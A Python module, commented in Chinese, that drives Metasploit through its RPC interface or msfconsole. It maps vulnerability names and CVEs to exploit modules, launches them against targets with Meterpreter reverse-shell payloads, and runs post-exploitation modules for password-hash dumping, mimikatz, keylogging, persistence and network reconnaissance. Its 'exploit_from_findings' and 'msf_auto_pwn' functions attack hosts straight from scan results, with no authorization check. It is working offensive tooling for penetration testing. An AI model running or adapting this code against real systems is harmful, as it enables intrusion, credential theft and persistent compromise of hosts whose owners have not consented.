#!/usr/bin/env python3
"""
Metasploit Bridge — Metasploit Framework RPC 集成
通过 MSFRPC 接口实现自动化后渗透操作

功能：
1. 连接 Metasploit RPC 服务（msfrpcd）
2. 自动搜索匹配的 exploit 模块
3. 配置并运行 exploit
4. Session 管理（Meterpreter/Shell）
5. 后渗透自动化（提权/信息收集/横移）
6. 与 auto_hunt findings 联动

前置条件：
    # 启动 msfrpcd（Kali 上）
    msfrpcd -P yourpassword -S -a 127.0.0.1

用法：
    from metasploit_bridge import MetasploitBridge

    msf = MetasploitBridge(password="yourpassword")
    await msf.connect()

    # 搜索 exploit
    modules = await msf.search_exploit("apache struts rce")

    # 自动利用
    session = await msf.auto_exploit(
        target="192.168.1.100",
        port=8080,
        vuln_type="rce",
        cve="CVE-2017-5638",
    )

    # 后渗透
    if session:
        info = await msf.post_exploit(session, actions=["sysinfo", "hashdump"])
"""

import asyncio
import json
import ssl
import time
import msgpack
from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional, Tuple
from datetime import datetime

try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    HAS_HTTPX = False


# ═══════════════════════════════════════════════════════════════
# 数据结构
# ═══════════════════════════════════════════════════════════════

@dataclass
class MsfSession:
    """Metasploit Session"""
    session_id: int = 0
    session_type: str = ""  # meterpreter/shell
    target_host: str = ""
    target_port: int = 0
    platform: str = ""  # windows/linux/osx
    arch: str = ""  # x86/x64
    info: str = ""
    via_exploit: str = ""
    via_payload: str = ""
    opened_at: str = ""


@dataclass
class ExploitResult:
    """Exploit 执行结果"""
    success: bool = False
    module: str = ""
    target: str = ""
    session: Optional[MsfSession] = None
    output: str = ""
    error: str = ""
    duration: float = 0


@dataclass
class PostExploitResult:
    """后渗透结果"""
    session_id: int = 0
    action: str = ""
    success: bool = False
    output: str = ""
    data: Dict[str, Any] = field(default_factory=dict)


# ═══════════════════════════════════════════════════════════════
# Exploit 模块知识库
# ═══════════════════════════════════════════════════════════════

# 常见漏洞 → Metasploit 模块映射
VULN_TO_MODULE_MAP = {
    # Web 应用
    "struts_rce": "exploit/multi/http/struts2_content_type_ognl",
    "struts2_s2_045": "exploit/multi/http/struts2_content_type_ognl",
    "tomcat_upload": "exploit/multi/http/tomcat_mgr_upload",
    "tomcat_ghostcat": "exploit/linux/http/apache_tomcat_ajp_lfi",
    "jenkins_rce": "exploit/multi/http/jenkins_script_console",
    "weblogic_rce": "exploit/multi/misc/weblogic_deserialize",
    "jboss_rce": "exploit/multi/http/jboss_invoke_deploy",
    "drupal_rce": "exploit/unix/webapp/drupal_drupalgeddon2",
    "wordpress_rce": "exploit/unix/webapp/wp_admin_shell_upload",
    "phpmyadmin_rce": "exploit/multi/http/phpmyadmin_lfi_rce",
    "log4j": "exploit/multi/http/log4shell_header_injection",
    # 服务
    "smb_ms17_010": "exploit/windows/smb/ms17_010_eternalblue",
    "smb_ms08_067": "exploit/windows/smb/ms08_067_netapi",
    "ssh_libssh": "exploit/linux/ssh/libssh_auth_bypass",
    "redis_rce": "exploit/linux/redis/redis_replication_cmd_exec",
    "elasticsearch_rce": "exploit/multi/elasticsearch/script_mvel_rce",
    "mysql_auth_bypass": "auxiliary/scanner/mysql/mysql_authbypass_hashdump",
    # 框架
    "spring4shell": "exploit/multi/http/spring_framework_rce_spring4shell",
    "thinkphp_rce": "exploit/multi/http/thinkphp_rce",
    "laravel_rce": "exploit/unix/http/laravel_token_unserialize_exec",
    "rails_rce": "exploit/multi/http/rails_secret_deserialization",
    # 通用
    "reverse_shell": "exploit/multi/handler",
    "bind_shell": "exploit/multi/handler",
}

# 常用 Payload
PAYLOADS = {
    "linux_reverse_tcp": "linux/x64/meterpreter/reverse_tcp",
    "linux_reverse_https": "linux/x64/meterpreter_reverse_https",
    "windows_reverse_tcp": "windows/x64/meterpreter/reverse_tcp",
    "windows_reverse_https": "windows/x64/meterpreter_reverse_https",
    "java_reverse_tcp": "java/meterpreter/reverse_tcp",
    "php_reverse_tcp": "php/meterpreter/reverse_tcp",
    "python_reverse_tcp": "python/meterpreter/reverse_tcp",
    "cmd_unix_reverse": "cmd/unix/reverse_bash",
    "cmd_windows_reverse": "cmd/windows/reverse_powershell",
}

# 后渗透模块
POST_MODULES = {
    "sysinfo": "post/multi/gather/system_info",
    "hashdump": "post/windows/gather/hashdump",
    "linux_hashdump": "post/linux/gather/hashdump",
    "enum_users": "post/multi/gather/enum_users",
    "enum_network": "post/multi/gather/network_info",
    "check_vm": "post/multi/gather/check_vm",
    "suggest_exploits": "post/multi/recon/local_exploit_suggester",
    "keylogger": "post/windows/capture/keylog_recorder",
    "screenshot": "post/multi/gather/screenshot",
    "arp_scan": "post/multi/gather/arp_scanner",
    "port_forward": "post/multi/manage/portfwd",
    "persistence": "post/windows/manage/persistence_exe",
    "mimikatz": "post/windows/gather/credentials/mimikatz",
}


# ═══════════════════════════════════════════════════════════════
# MSFRPC 客户端
# ═══════════════════════════════════════════════════════════════

class MSFRPCClient:
    """
    Metasploit RPC 客户端
    通过 HTTP(S) 与 msfrpcd 通信
    """

    def __init__(self, host: str = "127.0.0.1", port: int = 55553,
                 password: str = "", ssl: bool = True):
        self.host = host
        self.port = port
        self.password = password
        self.use_ssl = ssl
        self.token: str = ""
        self._base_url = f"{'https' if ssl else 'http'}://{host}:{port}/api/"

    async def connect(self) -> bool:
        """连接并认证"""
        try:
            result = await self._call("auth.login", ["", self.password])
            if result and result.get(b"result") == b"success":
                self.token = result.get(b"token", b"").decode()
                return True
        except Exception as e:
            # 降级：尝试直接命令行方式
            pass
        return False

    async def _call(self, method: str, params: list = None) -> Optional[Dict]:
        """调用 MSFRPC 方法"""
        if not HAS_HTTPX:
            return None

        payload = msgpack.packb([method] + (params or []))
        try:
            async with httpx.AsyncClient(verify=False, timeout=30) as client:
                resp = await client.post(
                    self._base_url,
                    content=payload,
                    headers={"Content-Type": "binary/message-pack"},
                )
                if resp.status_code == 200:
                    return msgpack.unpackb(resp.content, raw=True)
        except Exception:
            pass
        return None

    async def authenticated_call(self, method: str, params: list = None) -> Optional[Dict]:
        """带认证的 RPC 调用"""
        all_params = [self.token] + (params or [])
        return await self._call(method, all_params)

    async def search_modules(self, query: str) -> List[Dict]:
        """搜索模块"""
        result = await self.authenticated_call("module.search", [query])
        if not result:
            return []
        modules = []
        for item in result.get(b"modules", []):
            if isinstance(item, dict):
                modules.append({
                    "fullname": item.get(b"fullname", b"").decode(),
                    "name": item.get(b"name", b"").decode(),
                    "rank": item.get(b"rank", 0),
                    "description": item.get(b"description", b"").decode()[:200],
                })
        return modules

    async def get_sessions(self) -> Dict[int, Dict]:
        """获取所有活跃 session"""
        result = await self.authenticated_call("session.list", [])
        if not result:
            return {}
        sessions = {}
        for sid, info in result.items():
            if isinstance(sid, int) and isinstance(info, dict):
                sessions[sid] = {
                    "type": info.get(b"type", b"").decode(),
                    "info": info.get(b"info", b"").decode(),
                    "target_host": info.get(b"session_host", b"").decode(),
                    "platform": info.get(b"platform", b"").decode(),
                    "via_exploit": info.get(b"via_exploit", b"").decode(),
                }
        return sessions

    async def run_module(self, module_type: str, module_name: str,
                         options: Dict[str, str]) -> Optional[str]:
        """运行模块"""
        result = await self.authenticated_call(
            "module.execute",
            [module_type, module_name, options]
        )
        if result:
            return result.get(b"job_id", result.get(b"uuid", b"")).decode() if isinstance(result.get(b"job_id"), bytes) else str(result.get(b"job_id", ""))
        return None

    async def session_command(self, session_id: int, command: str) -> str:
        """在 session 中执行命令"""
        # Meterpreter
        result = await self.authenticated_call(
            "session.meterpreter_write",
            [str(session_id), command + "\n"]
        )
        await asyncio.sleep(2)
        result = await self.authenticated_call(
            "session.meterpreter_read",
            [str(session_id)]
        )
        if result and b"data" in result:
            return result[b"data"].decode()
        return ""


# ═══════════════════════════════════════════════════════════════
# Metasploit Bridge 主类
# ═══════════════════════════════════════════════════════════════

class MetasploitBridge:
    """
    Metasploit 集成桥接器

    支持两种模式：
    1. RPC 模式：通过 msfrpcd 完全控制（需要 Metasploit 运行）
    2. CLI 模式：通过 msfconsole -x 执行命令（降级方案）
    """

    def __init__(self, host: str = "127.0.0.1", port: int = 55553,
                 password: str = "msf", ssl: bool = True,
                 lhost: str = "", lport: int = 4444):
        self.rpc = MSFRPCClient(host, port, password, ssl)
        self.lhost = lhost or self._detect_lhost()
        self.lport = lport
        self._connected = False
        self._mode = "cli"  # rpc / cli

    async def connect(self) -> bool:
        """连接 Metasploit"""
        if await self.rpc.connect():
            self._connected = True
            self._mode = "rpc"
            return True
        # 降级到 CLI 模式
        self._mode = "cli"
        return await self._check_cli_available()

    # ─── 核心功能 ──────────────────────────────────────────

    async def search_exploit(self, query: str, cve: str = "") -> List[Dict]:
        """
        搜索匹配的 exploit 模块

        Args:
            query: 搜索关键词（如 "apache struts"）
            cve: CVE 编号（如 "CVE-2017-5638"）
        """
        # 先查本地知识库
        local_matches = []
        query_lower = query.lower()
        for key, module in VULN_TO_MODULE_MAP.items():
            if query_lower in key or (cve and cve.lower().replace("-", "_") in key):
                local_matches.append({
                    "fullname": module,
                    "name": key,
                    "source": "local_kb",
                })

        # RPC 搜索
        if self._mode == "rpc":
            search_term = cve if cve else query
            rpc_results = await self.rpc.search_modules(search_term)
            return local_matches + rpc_results

        return local_matches

    async def auto_exploit(
        self,
        target: str,
        port: int = 0,
        vuln_type: str = "",
        cve: str = "",
        platform: str = "linux",
    ) -> Optional[ExploitResult]:
        """
        自动利用漏洞

        Args:
            target: 目标 IP/域名
            port: 目标端口
            vuln_type: 漏洞类型关键词
            cve: CVE 编号
            platform: 目标平台 (linux/windows)
        """
        start = time.time()
        result = ExploitResult(target=target)

        # Step 1: 查找合适的模块
        modules = await self.search_exploit(vuln_type or cve, cve)
        if not modules:
            result.error = f"No exploit module found for: {vuln_type or cve}"
            return result

        module_name = modules[0].get("fullname", "")
        result.module = module_name

        # Step 2: 选择 payload
        payload = self._select_payload(platform)

        # Step 3: 配置选项
        options = {
            "RHOSTS": target,
            "PAYLOAD": payload,
            "LHOST": self.lhost,
            "LPORT": str(self.lport),
        }
        if port:
            options["RPORT"] = str(port)

        # Step 4: 执行
        if self._mode == "rpc":
            job_id = await self.rpc.run_module("exploit", module_name, options)
            if job_id:
                # 等待 session
                await asyncio.sleep(10)
                sessions = await self.rpc.get_sessions()
                for sid, info in sessions.items():
                    if target in info.get("target_host", ""):
                        result.success = True
                        result.session = MsfSession(
                            session_id=sid,
                            session_type=info.get("type", ""),
                            target_host=target,
                            target_port=port,
                            platform=info.get("platform", ""),
                            via_exploit=module_name,
                            via_payload=payload,
                        )
                        break
        else:
            # CLI 模式
            output = await self._cli_exploit(module_name, options)
            result.output = output
            if "session" in output.lower() or "meterpreter" in output.lower():
                result.success = True

        result.duration = time.time() - start
        return result

    async def post_exploit(
        self,
        session: MsfSession,
        actions: List[str] = None,
    ) -> List[PostExploitResult]:
        """
        后渗透操作

        Args:
            session: 活跃的 session
            actions: 要执行的后渗透动作列表
                可选: sysinfo, hashdump, enum_users, enum_network,
                      check_vm, suggest_exploits, screenshot, arp_scan
        """
        results = []
        actions = actions or ["sysinfo", "enum_network"]

        for action in actions:
            pr = PostExploitResult(session_id=session.session_id, action=action)

            if self._mode == "rpc":
                if action in POST_MODULES:
                    module = POST_MODULES[action]
                    options = {"SESSION": str(session.session_id)}
                    job_id = await self.rpc.run_module("post", module, options)
                    await asyncio.sleep(5)
                    pr.success = bool(job_id)
                    pr.output = f"Module {module} executed (job: {job_id})"
                else:
                    # 直接命令
                    output = await self.rpc.session_command(session.session_id, action)
                    pr.success = bool(output)
                    pr.output = output
            else:
                # CLI 模式
                output = await self._cli_post(session.session_id, action)
                pr.success = bool(output)
                pr.output = output

            results.append(pr)

        return results

    async def get_active_sessions(self) -> List[MsfSession]:
        """获取所有活跃 session"""
        if self._mode == "rpc":
            raw = await self.rpc.get_sessions()
            sessions = []
            for sid, info in raw.items():
                sessions.append(MsfSession(
                    session_id=sid,
                    session_type=info.get("type", ""),
                    target_host=info.get("target_host", ""),
                    platform=info.get("platform", ""),
                    via_exploit=info.get("via_exploit", ""),
                ))
            return sessions
        return []

    # ─── 辅助方法 ──────────────────────────────────────────

    def _detect_lhost(self) -> str:
        """检测本机 IP"""
        import socket
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    def _select_payload(self, platform: str) -> str:
        """根据平台选择 payload"""
        if platform == "windows":
            return PAYLOADS["windows_reverse_tcp"]
        elif platform == "java":
            return PAYLOADS["java_reverse_tcp"]
        elif platform == "php":
            return PAYLOADS["php_reverse_tcp"]
        return PAYLOADS["linux_reverse_tcp"]

    async def _check_cli_available(self) -> bool:
        """检查 msfconsole 是否可用"""
        try:
            proc = await asyncio.create_subprocess_shell(
                "which msfconsole",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            return proc.returncode == 0
        except Exception:
            return False

    async def _cli_exploit(self, module: str, options: Dict) -> str:
        """CLI 模式执行 exploit"""
        opts_str = " ".join([f"set {k} {v};" for k, v in options.items()])
        cmd = f'msfconsole -q -x "use {module}; {opts_str} exploit -z; exit" 2>/dev/null'
        try:
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=120)
            return stdout.decode("utf-8", errors="ignore")[:3000]
        except asyncio.TimeoutError:
            return "[TIMEOUT]"
        except Exception as e:
            return f"[ERROR: {e}]"

    async def _cli_post(self, session_id: int, action: str) -> str:
        """CLI 模式后渗透"""
        if action in POST_MODULES:
            module = POST_MODULES[action]
            cmd = f'msfconsole -q -x "use {module}; set SESSION {session_id}; run; exit" 2>/dev/null'
        else:
            cmd = f'msfconsole -q -x "sessions -i {session_id}; {action}; exit" 2>/dev/null'
        try:
            proc = await asyncio.create_subprocess_shell(
                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=60)
            return stdout.decode("utf-8", errors="ignore")[:3000]
        except Exception as e:
            return f"[ERROR: {e}]"

    # ─── 与 auto_hunt findings 联动 ──────────────────────────

    async def exploit_from_findings(self, findings: List[Dict]) -> List[ExploitResult]:
        """
        从 auto_hunt 的 findings 中自动尝试 Metasploit exploit

        只对有明确 CVE 或已知框架漏洞的发现执行
        """
        results = []
        for finding in findings:
            cve = finding.get("cve", "")
            vuln_type = finding.get("type", finding.get("vuln_type", ""))
            url = finding.get("url", "")
            # 提取 host:port
            if url:
                from urllib.parse import urlparse
                parsed = urlparse(url)
                host = parsed.hostname or ""
                port = parsed.port or (443 if parsed.scheme == "https" else 80)
            else:
                continue

            # 只对有 CVE 或已知类型的执行
            if cve or vuln_type in VULN_TO_MODULE_MAP:
                result = await self.auto_exploit(
                    target=host,
                    port=port,
                    vuln_type=vuln_type,
                    cve=cve,
                )
                if result:
                    results.append(result)

        return results


# ═══════════════════════════════════════════════════════════════
# 便捷接口
# ═══════════════════════════════════════════════════════════════

async def msf_search(query: str, password: str = "msf") -> List[Dict]:
    """快捷搜索 exploit 模块"""
    msf = MetasploitBridge(password=password)
    await msf.connect()
    return await msf.search_exploit(query)


async def msf_auto_pwn(target: str, port: int, cve: str = "",
                        vuln_type: str = "", password: str = "msf") -> Optional[ExploitResult]:
    """快捷自动利用"""
    msf = MetasploitBridge(password=password)
    await msf.connect()
    return await msf.auto_exploit(target, port, vuln_type=vuln_type, cve=cve)
